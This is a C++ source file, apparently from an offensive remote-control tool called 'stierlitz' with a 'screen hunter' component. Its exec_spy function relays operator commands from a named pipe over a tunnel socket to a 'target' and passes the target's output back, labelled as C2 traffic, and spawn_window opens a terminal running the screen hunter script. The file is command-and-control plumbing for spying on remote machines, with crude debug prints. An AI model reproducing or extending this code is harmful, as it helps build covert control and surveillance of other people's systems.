#include "screen_hunter.hpp"

void ScreenHunter::exec_spy() {
    int rc = accept_tunnel_end();
    
    if (rc < 0) {
        return;
    }

    fifo_in_ = fifo_path_ + (std::string) "_in"; // screen hunter command line READ_ONLY

    int tunnel_fifo_in_ = open(fifo_in_.c_str(), O_RDONLY | O_NONBLOCK);
    if (tunnel_fifo_in_ < 0) {
        write_fifo_error("Error while opening the fifo path");
        return;
    }

    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        write_fifo_error("[SpyTunnel::run] Error creating epoll_fd" + std::string(strerror(errno)));
        return;
    }

    struct epoll_event screen_hunter_c2_event;
    screen_hunter_c2_event.data.fd = tunnel_fifo_in_;
    screen_hunter_c2_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_fifo_in_, &screen_hunter_c2_event) < 0) {
        write_fifo_error("[SpyTunnel::run] Error adding screen hunter c2 event" + std::string(strerror(errno)));
        return;
    }

    struct epoll_event screen_hunter_tunnel_end_event;
    screen_hunter_tunnel_end_event.data.fd = tunnel_end_socket_;
    screen_hunter_tunnel_end_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &screen_hunter_tunnel_end_event) < 0) {
        std::cout << MAGENTA << "tunnel_end_socket_=" << tunnel_end_socket_ << std::endl;
        write_fifo_error("[SpyTunnel::run] Error adding tunnel_end_socket_ to epoll" + std::string(strerror(errno)));
        return;
    }

    char command[1024] = {0};
    char buffer[BUFFER_SIZE] = {0};

    struct epoll_event events[3];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 3, -1);
        std::cout << MAGENTA << "Shit1" <<  RESET;

        if (nfds < 0) {
            return;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                std::cout << MAGENTA << "Shit2" <<  RESET;
                // Server shuts down
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                    close(tunnel_fifo_in_);
                }
                return;
            } else if (events[i].data.fd == tunnel_fifo_in_) {
                // Command from screen hunter. Forward the command to the tunnel_socket_
                std::cout << MAGENTA << "Data received from tunnel_fifo_in_" << RESET << std::endl;
                rc = read(tunnel_fifo_in_, command, sizeof(command));
                if (rc <= 0) {
                    std::cout << MAGENTA << "Failed to read from tunnel_fifo_in_" << RESET << std::endl;
                    write_fifo_error("[SpyTunnel::run] Was unable to read command from tunnel_fifo_in_");
                    close(tunnel_fifo_in_);
                    return;
                } 

                rc = send(tunnel_end_socket_, command, rc, 0);
                if (rc <= 0) {
                    std::cout << MAGENTA << "Failed to send the command" << RESET << std::endl;
                    write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
                    close(tunnel_fifo_in_);
                    return;
                }


                if (strncmp(command, "exit", 4) == 0) {
                    close(tunnel_fifo_);
                    close(tunnel_fifo_in_);
                    return;
                } 
            } else if (events[i].data.fd == tunnel_end_socket_) {
                // Data from the target. Forward it to tunnel_fifo_
                std::cout << MAGENTA << "Data received from tunnel_end_socket_" << RESET << std::endl;
                rc = recv(tunnel_end_socket_, buffer, BUFFER_SIZE, 0);
                if (rc <= 0) {
                    std::cout << MAGENTA << "Failed tp receive from tunnel_end_socket_" << RESET << std::endl;
                    write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
                    close(tunnel_fifo_in_);
                    return;
                }
                std::cout << MAGENTA << "Shit3" <<  RESET;

                rc = write(tunnel_fifo_, buffer, rc);
                if (rc <= 0) {
                    close(tunnel_fifo_);
                    close(tunnel_fifo_in_);
                    tunnel_fifo_ = -1;
                    write_fifo_error("[SpyTunnel::run] Was unable to write buffer to tunnel_fifo_");
                    return;
                }
            }
        }
    }
}
void ScreenHunter::spawn_window() {
    std::string end_key_len_str = std::to_string(END_KEY_LEN);
    std::string res_update_key_len_str = std::to_string(RES_UPDATE_KEY_LEN);

    execlp(
        "urxvt", "urxvt", "-hold", "-name", "stierlitz_screen_hunter", 
        "-e", SCREEN_HUNTER_SCRIPT_PATH, 
        fifo_path_.c_str(), 
        END_KEY, end_key_len_str.c_str(), 
        RES_UPDATE_KEY, res_update_key_len_str.c_str(),
        (char*)NULL
    );
}